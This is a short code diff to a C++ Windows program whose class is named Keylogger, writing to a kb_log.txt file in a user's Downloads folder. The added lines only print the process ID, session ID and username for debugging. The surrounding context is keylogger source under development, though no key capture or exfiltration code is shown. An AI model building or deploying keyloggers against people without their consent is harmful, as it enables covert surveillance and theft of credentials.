@@ -4,6 +4,19 @@ std::ofstream Keylogger::kblog;
 wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
+    DWORD sessionId;
+    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
+
+    std::cerr << "Process ID: " << GetCurrentProcessId() << '\n';
+    std::cerr << "Session ID: " << sessionId << '\n';
+
+    wchar_t username[256];
+    DWORD size = 256;
+
+    if (GetUserNameW(username, &size)) {
+        std::wcout << L"Username: " << username << std::endl;
+    }
+
     HANDLE hFile = CreateFileW(
         L"C:\\Users\\brennan\\Downloads\\kb_log.txt",
         GENERIC_WRITE,
